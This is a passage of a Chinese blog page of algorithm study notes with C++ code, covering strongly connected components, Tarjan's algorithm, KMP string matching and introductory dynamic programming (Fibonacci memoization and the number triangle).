style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。<br>笔记来源： <a href="https://zhuanlan.zhihu.com/p/104764488">算法学习笔记 (11): 差分约束 </a></p><h2 id="图论难点"><a class="markdownIt-Anchor" href="#图论难点">#</a> 图论难点</h2><h3 id="强连通分量分解"><a class="markdownIt-Anchor" href="#强连通分量分解">#</a> 强连通分量分解</h3><p>【定义】对于一个有向图顶点的子集 S, 如果在 S 内任取两个顶点 u 和 v，都能找到一条从 u 到 v 的路径，那么就称 S 是强连通的。如果在强连通的顶点集合 S 中加入其他任意顶点集合后，它都不再是强连通的，那么就称 S 是原图的一个强连通分量。任意的有向图都可以分解成若干个不相交的强连通分量，这就是强连通分量分解。把分解后的强连通分量缩成一个顶点，就得到了一个 DAG（有向无环图）。</p><blockquote><p>强连通分量的分解可以通过两次简单的 DFS 实现。<br>第一次 DFS 时，选取任意顶点作为起点，遍历所有尚未访问过的顶点，并在回溯前给顶点标号。对剩余的未访问过的顶点，不断重复上述过程。<br>完成标号后，越接近图的尾部（搜索树的叶子节点），顶点的标号越小。第二次 DFS 时，先将所有边反向，然后以标号最大的顶点为起点进行 DFS|。这样 DFS 所遍历的顶点集合就构成了一个强连通分量。之后，只要还有尚未访问的顶点，就从中选取标号最大的顶点不断重复上述过程。<br>(注：反向之后在当前节点能够访问到的顶点即是双向可达的，因此可通过这个连看哪些顶点是联通的)</p></blockquote><p>将强连通分量缩点并得到 DAG。此时可以发现，标号最大的节点就属于 DAG 头部（搜索树的根）的强连通分量。因此，将边反向之后，就不能沿边访问到这个强连通分量以外的顶点。而对于强连通分量内的其他顶点，其可达性不受边反向的影响，因此在第二次 DFS 时，我们可以遍历一个强连通分量的所有顶点。<br>下面上代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> V; <span class="comment">// 定点数</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; G[MAX_V];  <span class="comment">//图的邻接边表示</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; rG[MAX_V]; <span class="comment">//把边反向后的表示</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vs;  <span class="comment">//后序遍历顺序的定点列表</span></span><br><span class="line"><span class="type">bool</span> used[MAX_V];   <span class="comment">//访问标记</span></span><br><span class="line"><span class="type">int</span> cmp[MAX_V]; <span class="comment">//所属强连通分量的拓扑序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_edge</span><span class="params">(<span class="type">int</span> from,<span class="type">int</span> to)</span></span>&#123;</span><br><span class="line">G[from].<span class="built_in">push_back</span>(to);</span><br><span class="line">rG[to].<span class="built_in">push_back</span>(from);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> v)</span></span>&#123;</span><br><span class="line">used[v] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; G[v].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[G[v][i]]) <span class="built_in">dfs</span>(G[v][i]);</span><br><span class="line">&#125;</span><br><span class="line">vs.<span class="built_in">push_back</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rdfs</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">used[v] = <span class="literal">true</span>;</span><br><span class="line">cmp[v] = k;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; rG[v].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[rG[v][i]]) <span class="built_in">rdfs</span>(rG[v][i],k);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">scc</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(used, <span class="number">0</span>,<span class="built_in">sizeof</span>(used));</span><br><span class="line">vs.<span class="built_in">clear</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> v = <span class="number">0</span>;v&lt; V;v++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[v]) <span class="built_in">dfs</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(used, <span class="number">0</span>,<span class="built_in">sizeof</span>(used));</span><br><span class="line"><span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = vs.<span class="built_in">size</span>() - <span class="number">1</span>; i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">if</span>(!used[vs[i]]) <span class="built_in">rdfs</span>(vs[i],k++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里给出一个例题，</p><h3 id="2-sat"><a class="markdownIt-Anchor" href="#2-sat">#</a> 2-SAT</h3><h3 id="tarjan算法强连通分量缩点-还未完全理解"><a class="markdownIt-Anchor" href="#tarjan算法强连通分量缩点-还未完全理解">#</a> Tarjan 算法 (强连通分量 / 缩点) 【还未完全理解】</h3><p>首先，我们知道最基础的 DFS 算法对图进行搜索通过 vis 数组来判断是否访问某个节点，不过这里我们引入一个叫做<strong>时间戳</strong>的概念，代表<strong>每个节点第一次被访问的时间</strong>。如果我们用 tot 变量作为当前的时间，每访问一个节点 tot++。<strong>越先访问的节点的时间戳越小，越后访问的节点时间戳越大</strong>。在下面的代码中，我们用<strong> dfn</strong> 数组作为每个点的时间戳，这样就可以取代 vis 数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dfn[MAXN],tot = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">dfn[u] = ++tot;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> e = first[u];e;e=nxt[e])&#123;</span><br><span class="line"><span class="type">int</span> v = go[e];</span><br><span class="line"><span class="keyword">if</span>(!dfn[v]) <span class="built_in">dfs</span>(v);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里强调一下：dfn [] 数组随访问顺序严格单调递增。其为我们寻找强连通分量奠定基础。在介绍如何寻找强连通分量之前，我们必须用 dfs 对图的边进行分类。图的边分为 4 类：<br><strong>（1）树边</strong> 指深度优先搜索树上的边。具体来说如果没有访问过，接下来要从 v 开始搜索，那么边 u-&gt;v 就是树边。<br><strong>（2）后向边</strong> 指将节点 u 连接到其在深度优先搜索树中的祖先节点 v 的边 u-&gt;v。我们可以直到，后向边一定有：   <code>dfn[v] !=0 &amp;&amp; dfn[v] &lt;= dfn[u]</code>  即：v 被访问过，且 v 比 u 先被访问。<br><strong>（3）前向边</strong> 和后向边相反，v 被访问过，且 v 比 u 后被访问。<br><strong>（4）横向边</strong> 所有其他的边被称为横向边满足以下性质 u-&gt;v 满足 dfn [u] &gt; dfn [v]。<br>强连通分量的定义上面已经给出。简单来说<strong>一个强连通分量的每两个点可以互相到达，且这个强连通分量的节点数尽可能大</strong>。<br>这里给出一个很重要的定理：<strong>若存在后向边 u-&gt;v，则 u,v 在同一个强连通分量中</strong><br>下面正式介绍 Tarjan 算法。我们如何判断一条边是不是后向边：可以看出，后向边 u-&gt;v 满足 dfn [v]&lt;=dfn [u]，同时横向边也满足此条件，因此我们不能简单根据 dfn 数组进行判断。<br><strong>解决</strong>：我们考虑维护一个<strong>栈</strong>，栈中的元素是当前搜索树上的点。显然，如果一条边 u-&gt;v 是后向边，那么我们在访问 u 时会发现<strong> v 已经在栈中</strong>。然后，如果 dfn [v]&lt;dfn [u]，则 u-&gt;v 是后向边。可以定义<strong> instack 数组</strong>，节点 u 入栈时 instack [u]=true，出栈时置为 false。在知道了 u-&gt;v 是后向边之后，我们再引入一个 low 数组，low [u] 代表<strong>包含 u 的 SCC 中第一个被搜索到的节点的 dfn 值</strong>，也可以理解为<strong>从 u 出发能回溯到的 dfn 最小节点的 dfn 值</strong>。显然，若 u-&gt;v 是一个后向边，那么 v 是 u 的祖先，v 是 v，u 所在的 SCC 中最先被访问到的节点。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> dfn[MAXN], tot = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> instack[MAXN];</span><br><span class="line"><span class="type">int</span> low[MAXN];</span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dfn[u] = ++tot;</span><br><span class="line">    low[u] = dfn[u]; <span class="comment">// 一开始low[u]是自己，有后向边再更新</span></span><br><span class="line">    stk.<span class="built_in">push</span>(u);</span><br><span class="line">    instack[u] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> e = first[u]; e; e = nxt[e])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v = go[e];</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">dfs</span>(v);</span><br><span class="line">            low[u] = <span class="built_in">min</span>(low[u], low[v]); <span class="comment">// 子节点更新了，我也要更新</span></span><br><span class="line">            <span class="comment">// 若子节点没更新，则min能够保证low[u] == dfn[u]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(instack[v]) <span class="comment">// v访问过且在栈中，意味着u→v是后向边</span></span><br><span class="line">        &#123;</span><br><span class="line">            low[u] = <span class="built_in">min</span>(low[u], dfn[v]);</span><br><span class="line">            <span class="comment">// 此处用min的原因是u→v可能是前向边，此时dfn[v]&gt;dfn[u]</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    stk.<span class="built_in">pop</span>();</span><br><span class="line">    instack[u] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> dfn[MAXN], tot = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> instack[MAXN];</span><br><span class="line"><span class="type">int</span> low[MAXN];</span><br><span class="line"><span class="type">int</span> co[MAXN], col = <span class="number">0</span>;</span><br><span class="line">std::stack&lt;<span class="type">int</span>&gt; stk;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Tarjan</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    dfn[u] = ++tot;</span><br><span class="line">    low[u] = dfn[u]; <span class="comment">// 一开始low[u]是自己，有后向边再更新</span></span><br><span class="line">    stk.<span class="built_in">push</span>(u);</span><br><span class="line">    instack[u] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> e = first[u]; e; e = nxt[e])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v = go[e];</span><br><span class="line">        <span class="keyword">if</span>(!dfn[v])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Tarjan</span>(v);</span><br><span class="line">            low[u] = <span class="built_in">min</span>(low[u], low[v]); <span class="comment">// 子节点更新了，我也要更新</span></span><br><span class="line">            <span class="comment">// 若子节点没更新，则min能够保证low[u] == dfn[u]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(instack[v]) <span class="comment">// v访问过且在栈中，意味着u→v是后向边</span></span><br><span class="line">        &#123;</span><br><span class="line">            low[u] = <span class="built_in">min</span>(low[u], dfn[v]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(low[u] == dfn[u]) <span class="comment">// 是SCC中的第一个被访问的节点</span></span><br><span class="line">    &#123;</span><br><span class="line">        co[u] = ++col;</span><br><span class="line">        <span class="keyword">while</span>(stk.<span class="built_in">top</span>() != u) co[stk.<span class="built_in">top</span>()] = col, instack[stk.<span class="built_in">top</span>()] = <span class="literal">false</span>, stk.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">// 染色，弹栈</span></span><br><span class="line">        instack[u] = <span class="literal">false</span>;</span><br><span class="line">        stk.<span class="built_in">pop</span>(); <span class="comment">// 最后把u弹出去</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考文献：<a href="https://blog.csdn.net/qaqwqaqwq/article/details/119884138?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170161277716800197087616%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170161277716800197087616&amp;biz_id=0&amp;spm=1018.2226.3001.4187">Tarjan 算法超超超详解</a></p><h1 id="字符串"><a class="markdownIt-Anchor" href="#字符串">#</a> 字符串</h1><h2 id="kmp算法"><a class="markdownIt-Anchor" href="#kmp算法">#</a> KMP 算法</h2><p>KMP 算法主要用来进行判断两个字符串是否 A 是 B 的子串。暴力的解法十分简单，1 只需要一一枚举文本串的起始位置 i 然后和模式串进行逐位匹配即可。</p><h4 id="next数组"><a class="markdownIt-Anchor" href="#next数组">#</a> next 数组</h4><p>介绍 KMP 算法要先来学习一下 Next 数组。假设有一个字符串 s (下标从 0 开始)，那么它以 i 号位作为结尾的子串就是 s [0…i]。对该子串来说，长度位 k+1 的前缀和后缀分别时 s [0…k] 和 s [i-k…i]。现在定义一个 int 型数组 next，其中<strong> next [i] 表示子串 s [0…i] 的前缀 s [0…k] 等于后缀 s [i-k…i] 的最大的 k (注意前缀和后缀可以部分重叠，但不能是 s [0…i] 本身)</strong> 如果找不到相等的前后缀，那么就令 next [i]= -1。显然，<strong>next [i] 就是所求最长相等前后缀中前缀最后一位的下标。</strong><br>这里可以利用递推来进行 Next 数组的求解。假设已经求出了 next [0]~next [i-1]，现在用它们来推出 next [i]。<br>通过这样可以列出下面伪代码求解过程:</p><ul><li>①初始化 next 数组，令 j = next [0] = -1。</li><li>②让 i 在 1 ~ len -1 范围遍历，对每一个 i，执行③④，求解 next [i]。</li><li>③不断令 j = next [i]，直到 j 回退为 - 1，或者是 s [i] == s [j+1] 成立。</li><li>④如果 s [i] == s [j+1]，则 next [i] = j +1; 否则 next [i] = j。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">getNext</span><span class="params">(<span class="type">char</span> s[], <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> j = <span class="number">-1</span>;</span><br><span class="line">next[<span class="number">0</span>] = <span class="number">-1</span>;    <span class="comment">//初始化 j= next[0] = -1</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; len;i++)&#123;   <span class="comment">//求解 next[1] ~ next[len -1]</span></span><br><span class="line"><span class="keyword">while</span>(j != <span class="number">-1</span> &amp;&amp;s[i] != s[j+<span class="number">1</span>])&#123;</span><br><span class="line">j = next[j];   <span class="comment">//反复令 j =next[j]</span></span><br><span class="line">&#125;   <span class="comment">//直到j回退到-1，或是 s[i] == s[j+1]</span></span><br><span class="line"><span class="keyword">if</span>(s[i] == s[j+<span class="number">1</span>])&#123;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">next[i] = j;  <span class="comment">//令 next[i] = j</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="kmp算法-2"><a class="markdownIt-Anchor" href="#kmp算法-2">#</a> KMP 算法</h4><p>在上文的基础，利用 next 数组即可进行 KMP 算法求解。这里也知晓了 next 数组的含义 ** 即当 j+1 位失配时，j 应该回退到的位置。由此总结除 KMP 算法的一般思路。</p><ul><li>①初始化 j = -1, 表示 pattern 当前已经被匹配的最后位。</li><li>②让 i 遍历文本串 text，对每一个 i，执行③④来试图匹配 text [i] 和 pattern [j + 1].</li><li>③不断令 j =next [j]，直到 j 回退为 -1，或者 text [i] == pattern [j + 1] 成立。</li><li>④如果 text [i] == pattern [j + 1], 则令 j++。如果 j 达到 m -1 ，则说明 pattern 是 text 的子串。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">KMP</span><span class="params">(<span class="type">char</span> text[], <span class="type">char</span> pattern[])</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n =<span class="built_in">strlen</span>(text), m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"><span class="built_in">getNext</span>(pattern,m);  <span class="comment">//计算pattern 的next 数组</span></span><br><span class="line"><span class="type">int</span> j=<span class="number">-1</span>;  <span class="comment">//初始化 j = -1 ，表示当前还没有任意一位被匹配</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; n; i++)&#123;   <span class="comment">//视图匹配text[i]</span></span><br><span class="line"><span class="keyword">while</span>(j != <span class="number">-1</span> &amp;&amp; text[i] != pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j = next[j];   <span class="comment">//不断回退，直到j 回到 -1 或者 text[i] == pattern[j+1]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(text[i] == pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j++;   <span class="comment">//text[i] 和pattern[j+1] 匹配成功</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == m <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码其实和求解 next 数组的代码惊人的相似。<strong>其实，求解 next 数组的过程就是模式串 pattern 进行自我匹配的过程。</strong><br>接着需要考虑 text 中 pattern 串出现的次数。这里考虑的主要是当 pattern 和 text 匹配完成之后，如何进行回退效率最高且不会遗漏解。这时还是利用 next 数组。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">KMP</span><span class="params">(<span class="type">char</span> text[], <span class="type">char</span> pattern[])</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n =<span class="built_in">strlen</span>(text), m = <span class="built_in">strlen</span>(pattern);</span><br><span class="line"><span class="built_in">getNext</span>(pattern,m);  <span class="comment">//计算pattern 的next 数组</span></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>,j =<span class="number">-1</span>;  <span class="comment">//初始化 j = -1 ，表示当前还没有任意一位被匹配</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i &lt; n; i++)&#123;   <span class="comment">//视图匹配text[i]</span></span><br><span class="line"><span class="keyword">while</span>(j != <span class="number">-1</span> &amp;&amp; text[i] != pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j = next[j];   <span class="comment">//不断回退，直到j 回到 -1 或者 text[i] == pattern[j+1]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(text[i] == pattern[j+<span class="number">1</span>])&#123;</span><br><span class="line">j++;   <span class="comment">//text[i] 和pattern[j+1] 匹配成功</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == m <span class="number">-1</span> )&#123;</span><br><span class="line">ans++;</span><br><span class="line">j = next[j]; <span class="comment">//让j回退到next[j]继续进行匹配</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans; <span class="comment">//返回成功匹配次数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对上述的 KMP 算法还有优化空间，</p><h1 id="动态规划"><a class="markdownIt-Anchor" href="#动态规划">#</a> 动态规划</h1><p>【定义】DP 使用来解决一类<strong>最优化问题</strong>的算法思想。动态规划将一个复杂的问题分解成若干的子问题，通过综合子问题的最优解来得到原问题的最优解。需要注意的是，动态规划将每个求结果的子问题的解记录下来，这样当下一次碰到同样的子问题时，就可以直接使用之前的记录的结果，而不是重复计算。一般可以使用递归或者递推的写法来实现动态规划，其中递归写法在此处也可以称为<strong>记忆化搜索</strong>。</p><h2 id="动态规划的递归和递推写法"><a class="markdownIt-Anchor" href="#动态规划的递归和递推写法">#</a> 动态规划的递归和递推写法</h2><h4 id="动态规划的递归写法"><a class="markdownIt-Anchor" href="#动态规划的递归写法">#</a> 动态规划的递归写法</h4><p>这里拿斐波那契数列的计算进行举例，正常没有优化的求解如下，根据斐波那契额数列的定义直接写代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">F</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>|| n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">F</span>(n<span class="number">-1</span>) + <span class="built_in">F</span>(n<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里事实上会进行很多的重复计算，例如 n = 5 时，F (5) = F (4) + F (3)，但是在计算 F (4) 时对 F (3) 又进行了一次计算。为了<strong>避免重复计算</strong>，可以开一个一维的 dp 数组，用来保存计算过的结果，这便是记忆化（即记录计算过的数据以此来防止重复计算带来的时间复杂度)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> dp[MAX_N]; <span class="comment">//这里可以初始化dp为 -1</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">F</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span> || n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(dp[n] != <span class="number">-1</span>) <span class="keyword">return</span> dp[n];</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">dp[n] = <span class="built_in">F</span>(n<span class="number">-1</span>) + <span class="built_in">F</span>(n<span class="number">-2</span>);</span><br><span class="line"><span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以把计算结果记录下来，下次再需要使用时可以省去计算。<br>通过上面的例子可以引申出一个概念：如果一个问题可以被分解为若干个子问题，并且这些子问题会重复出现，那么就称这个问题拥有<strong>重叠子问题</strong>。动态规划通过记录重叠子问题的解，来使下次碰到相同的子问题时可以直接使用之前的记录的结果。</p><h4 id="动态规划的递推写法"><a class="markdownIt-Anchor" href="#动态规划的递推写法">#</a> 动态规划的递推写法</h4><p>用经典的数塔问题为例子。将一些数字排成数塔的形状，其中第一层右一个数字，第二层二个数字，… 第 n 层 n 个数字。现在要从第一层走到第 n 层，每次只能走向下一层连接的两个数字中的一个，需要知道：到达底层将路径上的所有数字相加后得到的和最大是多少。<br>按照题目的描述，如果卡一个二维数组 f,f [i][j] 存放第 i 层的第 j 个数字。如果尝试琼剧所有路径，然后记录路径上数字和的最大值，那么时间复杂度 O (<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span>)<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/suanfa_1.png?raw=true" alt="数塔"><br>一开始，从第一层的 5 出发，按照 5-&gt;8-&gt;7 的路线来到 7，并枚举从 7 出发的到达最底层的所有路径。但是，之后按 5-&gt;3-&gt;7 时，如果没有进行记录，又会去枚举 7 出发的到达最底层的所有路径，这就导致了从 7 出发的到达最底层的所有路径被反复的访问。<br>由上面的考虑，不妨令 dp [i][j] 表示从第 i 行第 j 个数字出发到达最底层的所有路径中能得到的最大和，例如 dp [3][2] 就是图中的 7 到达最底层的路径最大和。在定义这个数组之后，dp [1][1] 就是我们最终想要的答案。注意到一个细节：如果要求从位置 (1,1) 到达最底层的最大和 dp [1][1]，那么一定要先求出它的两个子问题 &quot; 从位置 (2,1) 到达最底层的最大和 dp [2][1]“和” 从位置 